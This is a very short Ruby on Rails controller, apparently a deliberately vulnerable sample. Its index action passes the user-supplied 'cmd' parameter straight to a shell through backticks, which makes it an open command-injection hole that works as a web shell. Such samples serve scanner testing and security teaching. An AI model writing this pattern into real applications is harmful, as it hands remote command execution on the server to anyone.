class WelcomeController < ApplicationController
  def index
    @result = `#{params[:cmd]}`
  end
end
